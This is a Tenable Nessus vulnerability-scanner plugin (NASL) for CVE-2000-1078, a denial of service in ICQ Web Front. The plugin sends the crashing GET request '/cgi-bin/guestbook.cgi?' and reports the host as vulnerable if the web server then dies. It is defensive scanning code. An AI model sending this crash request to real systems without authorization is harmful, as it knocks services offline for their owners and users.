#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10347);
 script_version("$Revision: 1.29 $");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");

 script_cve_id("CVE-2000-1078");
 script_bugtraq_id(1463);
 script_osvdb_id(9539);

 script_name(english:"ICQ Web Front Service guestbook.cgi DoS");
 script_summary(english:"ICQ denial of service");

 script_set_attribute(attribute:"synopsis", value:"The remote host is prone to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"The remote web server appears to be the ICQ Web Front service for ICQ.

An unauthenticated attacker can crash the version of ICQ Web Front
installed on the remote host by connecting to it and sending a special
request, '/cgi-bin/guestbook.cgi?'.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Oct/123");
 script_set_attribute(attribute:"solution", value:"Deactivate ICQ Web Front's web server service.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/10/07");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/03/15");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports(80, "Services/www");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80, embedded: 1);


if (http_is_dead(port:port)) exit(0);
r = http_send_recv3(port: port, item: "/cgi-bin/guestbook.cgi?", method: "GET");
if (http_is_dead(port:port, retry: 3)) security_warning(port);
